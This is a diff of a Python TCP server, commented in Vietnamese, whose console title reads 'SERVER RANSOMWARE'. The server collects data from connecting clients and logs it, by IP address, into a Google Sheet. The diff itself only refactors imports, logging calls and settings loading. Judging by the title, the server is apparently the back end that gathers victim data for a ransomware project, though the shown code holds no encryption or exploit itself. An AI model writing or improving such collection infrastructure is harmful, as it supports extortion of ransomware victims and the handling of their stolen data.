@@ -2,10 +2,13 @@
 from __init__ import *
 from time import sleep
 from threading import Thread
-from modules.system import System, Console
-from modules.lib.sheet import GoogleSheet
-from modules.lib.setting import Setting
+from lib.system import System
+from lib.modules.yaml import safe_load
+from lib.modules.sheet import GoogleSheet
 from socket import socket, AF_INET, SOCK_STREAM
+
+
+Terminal = System()
 
 
 # Lớp Server để xử lý các kết nối và truyền dữ liệu
@@ -25,7 +28,7 @@ class Server:
                 if isinstance(data, bytes): 
                     data = data.decode()
                 self.sheet.UpdateValues([data.split('|')])  
-                Console(self.host ,f"Processed data from {address}", 'Yellow')
+                Terminal.Console(self.host ,f"Processed data from {address}", 'Yellow')
             else:
                 sleep(5)
 
@@ -39,21 +42,21 @@ class Server:
                 if not isinstance(data, bytes): 
                     data = data.encode()
                 self.data_queue.append([address[0], data])
-                Console(address[0], 
+                Terminal.Console(address[0], 
                         f'Packet data: {round(len(data)/1024, 3)} KB',
                         'Yellow')
             except Exception as error:
-                Console(address[0], error, 'Red')
+                Terminal.Console(address[0], error, 'Red')
                 break
         client.close()
-        Console(address[0], 'Disconnect', 'Blue')
+        Terminal.Console(address[0], 'Disconnect', 'Blue')
 
 
     # Xử lý các kết nối đến server
     def HandleConnections(self) -> None:
         while True:
             client, address = self.server.accept()
-            Console(address[0], 'Connect to Server', 'Orange')
+            Terminal.Console(address[0], 'Connect to Server', 'Orange')
             thread = Thread(target=self.HandleClient, args=(client, address))
             thread.start()
 
@@ -63,28 +66,29 @@ class Server:
         try:
             self.server.bind((self.host, self.port))
             self.server.listen()
-            Console(self.host, 'The server starts listening', 'Green')
+            Terminal.Console(self.host, 'The server starts listening', 'Green')
             thread = Thread(target=self.HandleConnections)
             thread.start()
 
             thread2 = Thread(target=self.HandleSheet)
             thread2.start()
         except:
-            Console(self.host, 'Address already in use', 'Red')
+            Terminal.Console(self.host, 'Address already in use', 'Red')
 
 
-#10rs_CfL4W5uKJI-ueX1n1MVZF4DT8uzqyb7wgtp0zfo
 # Hàm main để khởi tạo server và bắt đầu lắng nghe các kết nối
 if __name__ == '__main__':
-    Terminal = System()
     try:
         Terminal.Init()
         Terminal.Clear()
         Terminal.Title('SERVER RANSOMWARE')
         Terminal.Size(320, 240)
-        data = Setting()
+
+        with open('scripts/setting.yaml', 'r') as file:
+            data = safe_load(file)['server']
+
         Server(data[0], data[1], data[2]).Listening()
     except Exception as error:
-        Console('127.0.0.0', error, 'Red')
+        Terminal.Console('127.0.0.0', error, 'Red')
         sleep(20)
         Terminal.Reset()
